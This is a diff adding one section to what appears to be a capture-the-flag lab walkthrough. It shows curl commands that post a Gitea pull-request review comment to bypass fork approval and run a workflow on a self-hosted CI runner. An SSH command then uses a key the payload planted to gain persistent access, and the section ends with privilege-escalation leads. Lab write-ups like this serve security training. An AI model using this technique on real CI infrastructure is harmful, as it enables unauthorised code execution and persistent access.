@@ -2974,7 +2974,98 @@ message:
 - The empty `message` field confirms no error; a duplicate or invalid PR would have returned an error string here.
 
 **Next:** Post a review comment on the pull request to fire the `pull_request_review_comment` event and dispatch the workflow to the runner.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
 
+### 3.24 — Trigger the workflow and capture the user flag
+
+The malicious workflow is committed to the fork and a pull request exists. Posting a review comment fires the `pull_request_review_comment` event, which bypasses fork approval and dispatches the job to the self-hosted runner.
+
+**Commands:**
+
+```bash
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"event":"COMMENT","body":"go","commit_id":"04351e99f44e188b2d38771ff42f648bc1549dc5"}' \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/1/reviews" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print('id:', d.get('id')); print('state:', d.get('state')); print('message:', d.get('message',''))"
+```
+
+```bash
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/actions/tasks" \
+  | python3 -m json.tool | head -40
+```
+
+```bash
+ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; cat ~/user.txt'
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`"event":"COMMENT"`|Post a review without approving or requesting changes|A plain comment, not a verdict|
+|`"body":"go"`|Comment text|Arbitrary; content is irrelevant to the trigger|
+|`"commit_id":"<sha>"`|Anchors the review to the PR head commit|Required by the API to know which revision is being reviewed|
+|`/pulls/1/reviews`|Review-creation endpoint for PR #1|Where review comments are posted|
+|`/actions/tasks`|Lists workflow runs for the repository|Check whether the job fired and what happened|
+|`ssh -i /tmp/.runner_key`|Authenticate with the generated private key|Use the key the workflow planted|
+|`-o StrictHostKeyChecking=no`|Skip host key confirmation prompt|Avoid an interactive prompt on first connection|
+
+**Result:**
+
+```
+id: 1
+state: COMMENT
+message:
+```
+
+json
+
+```json
+{
+    "workflow_runs": [
+        {
+            "id": 6,
+            "name": "foothold",
+            "head_sha": "04351e99f44e188b2d38771ff42f648bc1549dc5",
+            "run_number": 7,
+            "event": "pull_request_review_comment",
+            "display_title": "ci",
+            "status": "success",
+            "workflow_id": "foothold.yml",
+            "url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/actions/runs/7",
+            "run_started_at": "2026-07-29T05:50:28-07:00"
+        },
+        ...
+    ]
+}
+```
+
+```
+uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)
+15894657ad499e82c308ce5f11a7c47c
+```
+
+**USER FLAG: `15894657ad499e82c308ce5f11a7c47c`**
+
+**What this gives you:** Command execution and persistent SSH access as `svc-runner`, plus the user flag.
+
+**Key findings:**
+
+- **The approval bypass is confirmed.** Workflow runs show `event: pull_request_review_comment` with `status: success` and no pending-approval state. A fork-originated workflow executed on the upstream repository's runner without maintainer review.
+- **SSH access as `svc-runner` established** using the key planted by the payload. Access is persistent and survives runner restarts.
+- **`svc-runner` is a domain account, not a local one.** UID `780601113` and GID `780600513` fall in the SSSD ID-mapping range for domain principals; GID 780600513 corresponds to the well-known `Domain Users` RID 513.
+- **Membership in a non-default group: `servicehandler` (GID 780601114).** This group does not exist in a default Active Directory installation and was created deliberately. Custom groups are typically created to delegate specific rights, making this the most promising lead for privilege escalation.
+- Each review comment fires an independent workflow run. Repeated comments produced runs 5, 6, and 7, all successful — the bypass is repeatable rather than a one-off race.
+- The runner executes jobs directly on SRV01 rather than in an isolated container, so the payload had full filesystem access to `/home/svc-runner`.
 <div align="center">
 <br>
 <br>
